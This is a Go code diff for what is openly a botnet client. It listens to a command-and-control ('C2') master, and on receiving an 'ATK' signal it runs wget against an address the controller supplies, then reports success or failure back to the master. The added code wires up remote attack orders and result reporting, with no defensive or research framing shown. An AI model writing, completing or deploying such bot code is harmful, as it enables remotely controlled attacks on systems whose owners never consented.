@@ -15,6 +15,11 @@ type Message struct {
 	From    string `json:"from"`
 }
 
+const (
+	SIGNAL_ATK = "ATK"
+	SIGNAL_STP = "STP"
+)
+
 type Bot struct {
 	Addr   string
 	Master string
@@ -38,20 +43,39 @@ func (b *Bot) Connect() error {
 
 // Handler function to execute local scripts depending on received signal from C2 layer
 func (b *Bot) Execute(fname string, args string) error {
-
-	// TODO: Also send log messages back to C2
+	var errMsg string
 
 	args = strings.TrimSpace(args)
 	if args == "" {
-		return fmt.Errorf("[×] Failed to execute %s: No args received!\n", fname)
+		errMsg = fmt.Sprintf("[×] Failed to execute %s: No args received!\n", fname)
+		b.Conn.WriteJSON(Message{
+			Payload: errMsg,
+			From:    b.Addr,
+		})
+
+		return fmt.Errorf(errMsg)
 	}
 
-	cmd := exec.Command("") // TODO: @Azime Benzema [Execute relevant scripts]
+	// TODO: Also validate valid address
+
+	cmd := exec.Command("wget", "-qO-", args)
 	if output, err := cmd.CombinedOutput(); err != nil {
-		return fmt.Errorf("[×] Failed during exection of %s: %s\n%s", fname, err, output)
+		errMsg = fmt.Sprintf("[×] Failed during exection of %s: %s\n%s", fname, err, output)
+		b.Conn.WriteJSON(Message{
+			Payload: errMsg,
+			From:    b.Addr,
+		})
+
+		return fmt.Errorf(errMsg)
 	}
 
-	log.Printf("[✓] Executed %s! Args: %s", fname, args)
+	successMsg := fmt.Sprintf("[✓] Executed %s! Args: %s", fname, args)
+	log.Printf(successMsg)
+	b.Conn.WriteJSON(Message{
+		Payload: successMsg,
+		From:    b.Addr,
+	})
+
 	return nil
 }
 
@@ -72,9 +96,12 @@ func (b *Bot) Listen() error {
 			continue
 		}
 
-		// TODO: @Azime Benzema [Read incound signals and proceed accordingly]
-
 		log.Printf("[C] Received: %s", msg.Payload)
+		if strings.HasPrefix(msg.Payload, SIGNAL_ATK) {
+			if err := b.Execute("attack.sh", strings.Split(msg.Payload, SIGNAL_ATK)[1]); err != nil {
+				log.Printf(err.Error())
+			}
+		}
 	}
 }
 
